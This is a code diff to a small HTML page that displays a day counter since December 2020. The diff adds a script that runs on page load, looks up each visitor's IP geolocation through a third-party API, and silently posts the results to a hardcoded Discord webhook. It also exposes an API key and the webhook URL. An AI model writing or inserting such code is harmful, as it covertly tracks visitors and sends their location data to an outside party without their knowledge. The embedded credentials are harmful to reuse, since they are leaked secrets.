@@ -10,7 +10,23 @@
 <body>
     <h1 style="text-align:center;font-family:courier,arial,helvetica;font-size: 100px" id="debt"></h1>
 </body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script>
+    function sendMessage() {
+        let apiKey = '97dfc3292d51457cb4896a109efd4cc4';
+        $.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey, function (data) {
+            const request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/885997086103977985/vbQMU6OzZmrHwLmUNRZA61n-FbRzi0_aCx9b1dnV_BarcyOMtcTgr9rw1hQPQ5YPy7GS");
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                username: "Promiser bot",
+                content: JSON.stringify(data)
+            }
+            request.send(JSON.stringify(params));
+        });
+
+    }
+    sendMessage();
     let startDate = new Date(2020, 11, 25);
     let dateNow = new Date();
     const diffTime = Math.abs(dateNow - startDate);
